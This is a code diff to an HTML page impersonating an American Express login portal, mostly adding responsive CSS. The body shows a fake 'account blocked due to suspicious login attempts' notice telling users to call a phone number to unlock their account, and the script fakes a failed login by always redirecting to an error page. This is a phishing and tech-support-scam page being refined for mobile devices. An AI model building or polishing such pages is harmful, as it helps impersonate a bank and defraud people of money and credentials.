@@ -23,10 +23,21 @@
       padding: 10px 30px;
       border-bottom: 1px solid #ddd;
       justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 10px;
     }
 
     .logo img {
-      height: 40px;
+      height: 30px;
+      max-width: 100%;
+    }
+
+    .navbar nav {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      flex: 1 1 auto;
+      justify-content: center;
     }
 
     .navbar nav a {
@@ -34,12 +45,16 @@
       text-decoration: none;
       color: #0077c5;
       font-weight: 500;
+      white-space: nowrap;
     }
 
     .right-nav {
       display: flex;
       align-items: center;
       gap: 15px;
+      flex-wrap: wrap;
+      justify-content: flex-end;
+      min-width: 150px;
     }
 
     .login-button {
@@ -49,13 +64,15 @@
       padding: 8px 16px;
       border-radius: 4px;
       cursor: pointer;
+      white-space: nowrap;
     }
 
     .container {
       display: flex;
       justify-content: center;
-      padding: 40px;
+      padding: 40px 20px;
       gap: 40px;
+      flex-wrap: wrap;
     }
 
     .login-box {
@@ -64,6 +81,8 @@
       border-radius: 8px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
       width: 350px;
+      max-width: 100%;
+      box-sizing: border-box;
     }
 
     .login-box h2 {
@@ -125,13 +144,89 @@
     .promo-box img {
       width: 350px;
       border-radius: 8px;
+      max-width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    p strong {
+      font-size: 1rem;
+      line-height: 1.4;
+      color: #000;
+    }
+
+    p strong a {
+      color: blue;
+      text-decoration: none;
+    }
+
+    /* Responsive styles */
+    @media (max-width: 768px) {
+      .navbar {
+        padding: 10px 15px;
+      }
+
+      .logo img {
+        height: 25px;
+      }
+
+      .navbar nav {
+        justify-content: center;
+        gap: 8px;
+      }
+
+      .navbar nav a {
+        margin: 5px;
+        font-size: 14px;
+      }
+
+      .right-nav {
+        justify-content: center;
+        min-width: auto;
+        gap: 10px;
+      }
+
+      .container {
+        flex-direction: column;
+        padding: 20px 15px;
+        gap: 30px;
+      }
+
+      .login-box {
+        width: 100%;
+        padding: 20px;
+      }
+
+      .promo-box img {
+        width: 100%;
+      }
+    }
+
+    @media (max-width: 400px) {
+      .logo img {
+        height: 20px;
+      }
+
+      .navbar nav a {
+        font-size: 13px;
+        margin: 4px 6px;
+      }
+
+      .login-button {
+        padding: 6px 12px;
+        font-size: 14px;
+      }
+
+      p strong {
+        font-size: 0.9rem;
+      }
     }
   </style>
 </head>
 <body>
   <header class="navbar">
     <div class="logo">
-      <img src="logo.png" alt="Amex Logo">
+      <img src="logo.png" alt="Amex Logo" />
     </div>
     <nav>
       <a href="#">My Account</a>
@@ -151,24 +246,16 @@
   <main class="container">
     <div class="login-box">
       <form onsubmit="return validateForm(event)">
-        
-
-
-
-<p>
-  <strong>
-    "Your American Express account access has been blocked due to suspicious login attempts. 
-    Contact our customer service team at 
-    <a href="tel:+18443925473" style="color: blue; text-decoration: none;">
-      +1 (844) 392-5473
-    </a> to verify and unlock your account."
-  </strong>
-</p>
-
-
-        
-
-        
+        <p>
+          <strong>
+            Your American Express account access has been blocked due to suspicious login attempts. 
+            Contact our customer service team at 
+            <a href="tel:+18443925473">+1 (844) 392-5473</a> to verify and unlock your account.
+          </strong>
+        </p>
+      </form>
+    </div>
+  </main>
 
   <script>
     function togglePassword() {
@@ -182,26 +269,23 @@
       const password = document.getElementById("password");
       let valid = true;
 
-      // Reset previous error styles
-      userId.classList.remove("error");
-      password.classList.remove("error");
+      if(userId) userId.classList.remove("error");
+      if(password) password.classList.remove("error");
 
-      // Basic dummy validation
-      if (userId.value.trim() === "") {
+      if(userId && userId.value.trim() === "") {
         userId.classList.add("error");
         valid = false;
       }
 
-      if (password.value.trim() === "") {
+      if(password && password.value.trim() === "") {
         password.classList.add("error");
         valid = false;
       }
 
       if (!valid) {
-        return false; // Prevent redirect
+        return false;
       }
 
-      // Fake failed login attempt: always redirect to error.html
       window.location.href = "error.html";
     }
   </script>
